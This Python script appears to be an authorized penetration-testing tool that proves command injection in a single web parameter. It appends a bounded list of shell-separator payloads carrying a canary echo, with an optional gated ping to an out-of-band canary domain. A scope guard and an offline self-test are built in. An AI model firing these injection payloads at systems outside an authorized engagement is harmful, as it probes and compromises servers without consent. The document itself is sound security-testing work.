#!/usr/bin/env python3
"""rce_verify.py - bounded command-injection proof via canary echo.

Tries a bounded, canonical template list (canary echo / printf through the
standard shell separators; DNS-safe ping as a blind note-only fallback) against
ONE parameter, and reports execution ONLY when the canary marker appears in a
response body. Prints the working payload and a short response excerpt, then
exits 0. Exit 1 when the bounded list is exhausted without proof.

Safety: no reverse shells, no staged payloads, no destructive commands — the
template list below is the complete set this script will ever send. Blind
ping payloads are sent only with --allow-ping --canary-domain, are DNS-safe
(one packet, bounded wait), and are verified on the 20-traffic-manipulation
OOB listener, not in this response.

Usage:
  python3 rce_verify.py --scope-file scope.json \
      --target "http://target.example.com/ping" --param host --method GET \
      --canary rj-pt-eng1-ab12 [--value 127.0.0.1] \
      [--allow-ping --canary-domain canary.rj-pt.example]

Exit codes: 0 = execution proved (canary seen in response); 1 = no proof /
error; 2 = scope refusal. --self-test never touches the network.

Evidence expectation: keep evidence/p6-rce-<param>-<seq>.{req,resp}.txt for
the working request and its baseline; D2 requires a second clean-state run.
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

import ipaddress
import socket

USER_AGENT = "redjohn-pentestskills/rce_verify/1.0"

# Bounded inline template list: (name, template). {CANARY} is substituted.
INLINE_TEMPLATES = [
    ("semi", ";echo {CANARY}"),
    ("pipe", "|echo {CANARY}"),
    ("andand", "&&echo {CANARY}"),
    ("oror", "||echo {CANARY}"),
    ("newline", "\necho {CANARY}"),
    ("backtick", "`echo {CANARY}`"),
    ("dollarparen", "$(echo {CANARY})"),
    ("printf", ";printf %s {CANARY}"),
]

# Blind fallback: DNS-safe single packet, bounded wait. Note-only unless both
# --allow-ping and --canary-domain are given; verified on the 20 OOB listener.
BLIND_TEMPLATES = [
    ("ping-dns", ";ping -c 1 -W 1 {DOMAIN}"),
    ("ping-dns-newline", "\nping -c 1 -W 1 {DOMAIN}"),
]

EXCERPT_RADIUS = 80

# ---------------------------------------------------------------- scope guard


_INTERNAL_NETS = (
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("100.64.0.0/10"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("::/128"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
)
_PINNED_DNS = {}


def _is_internal_ip(ip_obj):
    if isinstance(ip_obj, ipaddress.IPv6Address) and ip_obj.ipv4_mapped:
        ip_obj = ip_obj.ipv4_mapped
    return (
        ip_obj.is_loopback
        or ip_obj.is_link_local
        or ip_obj.is_unspecified
        or ip_obj.is_multicast
        or any(ip_obj in net for net in _INTERNAL_NETS)
    )


def host_allowed(target, scope):
    """Return (allowed, reason). Fail closed on any parse/DNS error."""
    try:
        parsed = urllib.parse.urlparse(target)
        if parsed.scheme not in ("http", "https"):
            return False, "scheme-not-http(s)"
        host = (parsed.hostname or "").lower()
        if not host:
            return False, "no-host"
        for denied in scope.get("out_of_scope", []):
            pat = denied.get("pattern", "").lower().lstrip("*.")
            if pat and (host == pat or host.endswith("." + pat)):
                return False, "out-of-scope"
        try:
            addrs = list(dict.fromkeys(
                info[4][0] for info in socket.getaddrinfo(host, None)
            ))
        except socket.gaierror:
            return False, "dns-unresolvable"
        if not addrs:
            return False, "dns-unresolvable"
        try:
            host_ip = ipaddress.ip_address(host)
        except ValueError:
            host_ip = None
        allowed_entries = scope.get("allowed", [])
        matched_reason = None
        for addr in addrs:
            ip_obj = ipaddress.ip_address(addr)
            addr_ok = False
            for entry in allowed_entries:
                ehost = entry.get("host", "").lower()
                if ehost and ehost == host:
                    if (
                        (host_ip is not None and ip_obj == host_ip)
                        or (host == "localhost" and ip_obj.is_loopback)
                        or not _is_internal_ip(ip_obj)
                    ):
                        addr_ok = True
                        matched_reason = matched_reason or "host"
                        break
                if "cidr" in entry:
                    net = ipaddress.ip_network(entry["cidr"], strict=False)
                    if ip_obj in net:
                        addr_ok = True
                        matched_reason = matched_reason or "cidr"
                        break
            if not addr_ok:
                return False, "not-in-scope"
        _PINNED_DNS[host] = tuple(addrs)
        return True, (matched_reason or "host")
    except Exception as exc:  # fail closed on anything unexpected
        return False, "error:%s" % exc


def require_in_scope(target, scope_file):
    """Exit(2) unless target is inside the engagement scope."""
    with open(scope_file, "r", encoding="utf-8") as fh:
        scope = json.load(fh)
    ok, why = host_allowed(target, scope)
    if not ok:
        sys.stderr.write(
            "[scope-guard] refused %s (%s) engagement=%s\n"
            % (target, why, scope.get("engagement", "unnamed"))
        )
        sys.exit(2)
    return scope


# ---------------------------------------------------------------- payloads


def render_inline(canary):
    """Return [(name, payload)] with the canary substituted."""
    out = []
    for name, template in INLINE_TEMPLATES:
        payload = template.replace("{CANARY}", canary)
        assert "{CANARY}" not in payload
        out.append((name, payload))
    return out


def render_blind(domain):
    out = []
    for name, template in BLIND_TEMPLATES:
        payload = template.replace("{DOMAIN}", domain)
        assert "{DOMAIN}" not in payload
        out.append((name, payload))
    return out


def build_blind_list(allow_ping, canary_domain):
    """Blind payloads only when explicitly gated; else note-only."""
    if allow_ping and canary_domain:
        return render_blind(canary_domain)
    return []


# ---------------------------------------------------------------- transport


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def build_request(target, param, value, method):
    if method == "GET":
        sep = "&" if urllib.parse.urlparse(target).query else "?"
        url = target + sep + urllib.parse.urlencode({param: value})
        return url, None
    data = urllib.parse.urlencode({param: value}).encode("utf-8")
    return target, data


def send_request(target, param, value, method, timeout):
    url, data = build_request(target, param, value, method)
    headers = {"User-Agent": USER_AGENT}
    if data is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with _OPENER.open(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as err:  # error/redirect bodies can carry the canary
        return err.code, err.read()


def marker_found(body, canary):
    return canary.encode("utf-8") in body


def excerpt(body, canary, radius=EXCERPT_RADIUS):
    text = body.decode("utf-8", errors="replace")
    idx = text.find(canary)
    if idx == -1:
        return "(marker absent)"
    start = max(0, idx - radius)
    end = min(len(text), idx + len(canary) + radius)
    return text[start:end].replace("\n", "\\n")


# ---------------------------------------------------------------- main flow


def run(args):
    scope = require_in_scope(args.target, args.scope_file)
    print("[scope] ok engagement=%s target=%s" %
          (scope.get("engagement", "unnamed"), args.target))

    status, body = send_request(args.target, args.param, args.value,
                                args.method, args.timeout)
    print("[baseline] value=%r status=%d len=%d marker-present=%s" % (
        args.value, status, len(body), marker_found(body, args.canary)))
    if marker_found(body, args.canary):
        sys.stderr.write(
            "[error] canary already present in baseline response; choose a "
            "fresh nonce\n")
        sys.exit(1)

    payloads = render_inline(args.canary)
    print("[plan] bounded inline list: %d payloads, serial, stop at first "
          "proof" % len(payloads))

    for name, payload in payloads:
        time.sleep(args.delay)
        status, body = send_request(args.target, args.param,
                                    args.value + payload, args.method,
                                    args.timeout)
        if marker_found(body, args.canary):
            print("[proof] working payload: %r (template: %s)" %
                  (args.value + payload, name))
            print("[proof] response excerpt: ...%s..." %
                  excerpt(body, args.canary))
            print("[evidence] keep evidence/p6-rce-%s-<seq>.{req,resp}.txt "
                  "for this request plus the baseline; D2 = one clean-state "
                  "replay with both runs captured" % args.param)
            print("[evidence] command slot was a canary echo only; cleanup "
                  "per references/impact-safety.md")
            sys.exit(0)

    blind = build_blind_list(args.allow_ping, args.canary_domain)
    if blind:
        for name, payload in blind:
            time.sleep(args.delay)
            send_request(args.target, args.param, args.value + payload,
                         args.method, args.timeout)
            print("[blind] sent %r (template: %s); verify the single DNS hit "
                  "on the 20 OOB listener (%s)" %
                  (args.value + payload, name, args.canary_domain))
        print("[blind] DNS hit = execution signal (D1); replay for D2")
    else:
        print("[blind] DNS-safe fallback NOT sent (needs --allow-ping "
              "--canary-domain): ;ping -c 1 -W 1 <canary-domain>")

    print("[result] no execution proof with the bounded template list")
    sys.exit(1)


# ---------------------------------------------------------------- self-test


def _fake_getaddrinfo(host, port, *args, **kwargs):
    """Offline DNS stand-in: canned answers only, no network."""
    fake = {
        "example.com": ["93.184.216.34"],
        "localhost": ["127.0.0.1"],
        "127.0.0.1": ["127.0.0.1"],
        "10.0.0.5": ["10.0.0.5"],
    }
    if host in fake:
        return [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", (addr, port))
            for addr in fake[host]
        ]
    raise socket.gaierror(2, "offline fixture: unknown host")


def self_test():
    original = socket.getaddrinfo
    socket.getaddrinfo = _fake_getaddrinfo
    try:
        local_scope = {"engagement": "selftest",
                       "allowed": [{"host": "localhost"}]}
        # 1. guard refuses https://example.com under a localhost-only scope
        ok, why = host_allowed("https://example.com", local_scope)
        assert ok is False, "example.com must be refused, got %s" % why
        # 2. guard refuses a private IP without an explicit CIDR entry
        ok, why = host_allowed("http://10.0.0.5/", local_scope)
        assert ok is False and why == "not-in-scope", (ok, why)
        # 3. guard allows http://127.0.0.1:PORT when that host is listed
        loop_scope = {"engagement": "selftest",
                      "allowed": [{"host": "127.0.0.1"}]}
        ok, why = host_allowed("http://127.0.0.1:8080/", loop_scope)
        assert ok is True, "listed loopback must be allowed, got %s" % why
        # extra: cidr coverage, scheme check, unresolvable, empty scope
        cidr_scope = {"engagement": "selftest",
                      "allowed": [{"cidr": "127.0.0.0/8"}]}
        ok, _ = host_allowed("http://127.0.0.1:9999/x", cidr_scope)
        assert ok is True, "cidr 127.0.0.0/8 must allow loopback"
        ok, why = host_allowed("ftp://127.0.0.1/x", loop_scope)
        assert ok is False and why == "scheme-not-http(s)", why
        ok, why = host_allowed("http://no-such-host.invalid/", local_scope)
        assert ok is False and why == "dns-unresolvable", why
        ok, _ = host_allowed("http://10.0.0.5/", {"allowed": []})
        assert ok is False, "empty scope must refuse everything"
    finally:
        socket.getaddrinfo = original

    # template rendering fixtures (bounded, no network)
    canary = "rj-pt-selftest-n1"
    inline = render_inline(canary)
    assert len(inline) == len(INLINE_TEMPLATES) == 8, "list must stay bounded"
    for name, payload in inline:
        assert "{CANARY}" not in payload, "unsubstituted template: %s" % name
        assert canary in payload, "canary missing in: %s" % name
    names = [n for n, _ in inline]
    assert names[0] == "semi" and "printf" in names and "newline" in names
    assert inline[0][1] == ";echo " + canary
    assert inline[4][1] == "\necho " + canary
    assert "$(echo " + canary + ")" in [p for _n, p in inline]

    # blind gating: absent unless both flag and domain given
    assert build_blind_list(False, "canary.rj-pt.example") == []
    assert build_blind_list(True, None) == []
    blind = build_blind_list(True, "canary.rj-pt.example")
    assert len(blind) == 2 and "ping -c 1 -W 1 canary.rj-pt.example" in \
        blind[0][1]
    for _n, payload in blind:
        assert "{DOMAIN}" not in payload

    # marker detection + excerpt fixtures
    assert marker_found(b"ok: rj-pt-selftest-n1 done", canary)
    assert not marker_found(b"ok: other content", canary)
    exc = excerpt(b"AAAA>>rj-pt-selftest-n1<<BBBB", canary)
    assert "rj-pt-selftest-n1" in exc and "AAAA" in exc and "BBBB" in exc
    assert excerpt(b"nothing here", canary) == "(marker absent)"
    assert "\n" not in excerpt(b"line1\nrj-pt-selftest-n1\nline2", canary)

    # request build fixtures (strings only, no request sent)
    url, data = build_request("http://127.0.0.1:8080/ping", "host",
                              "1;echo x", "GET")
    assert urllib.parse.unquote_plus(url).endswith("host=1;echo x"), url
    url, data = build_request("http://127.0.0.1:8080/ping", "host",
                              "1;echo x", "POST")
    assert data == urllib.parse.urlencode({"host": "1;echo x"}).encode()

    print("[self-test] rce_verify: guard assertions, bounded template "
          "rendering, blind gating, marker/excerpt and request-build fixtures "
          "passed (no network)")


# ---------------------------------------------------------------- cli


class _Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        sys.stderr.write("error: %s\n" % message)
        sys.exit(1)


def main():
    parser = _Parser(
        description="Bounded canary-echo command-execution proof "
                    "(one parameter, bounded payload list).")
    parser.add_argument("--scope-file", default=None,
                        help="engagement scope JSON (or env REDJOHN_SCOPE_FILE)")
    parser.add_argument("--target", help="target URL (in scope)")
    parser.add_argument("--param", help="parameter name to inject into")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--value", default="1",
                        help="original parameter value (payload prefix)")
    parser.add_argument("--canary", default=None,
                        help="canary string, e.g. rj-pt-<eng>-<nonce>")
    parser.add_argument("--allow-ping", action="store_true",
                        help="allow the DNS-safe blind ping payloads "
                             "(single packet, bounded wait)")
    parser.add_argument("--canary-domain", default=None,
                        help="engagement OOB canary domain (20 listener), "
                             "e.g. canary.rj-pt.example")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--delay", type=float, default=0.2,
                        help="serial politeness delay between probes (s)")
    parser.add_argument("--self-test", action="store_true",
                        help="run offline self-test (no network) and exit")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    if not args.target or not args.param or not args.canary:
        parser.error("--target, --param and --canary are required")
    if " " in args.canary:
        parser.error("--canary must be a single token (no spaces)")
    if args.allow_ping and not args.canary_domain:
        parser.error("--allow-ping requires --canary-domain "
                     "(engagement OOB listener domain)")
    scope_file = args.scope_file or os.environ.get("REDJOHN_SCOPE_FILE")
    if not scope_file:
        sys.stderr.write("[error] no scope file: pass --scope-file or set "
                         "REDJOHN_SCOPE_FILE\n")
        sys.exit(1)
    args.scope_file = scope_file
    run(args)


if __name__ == "__main__":
    main()
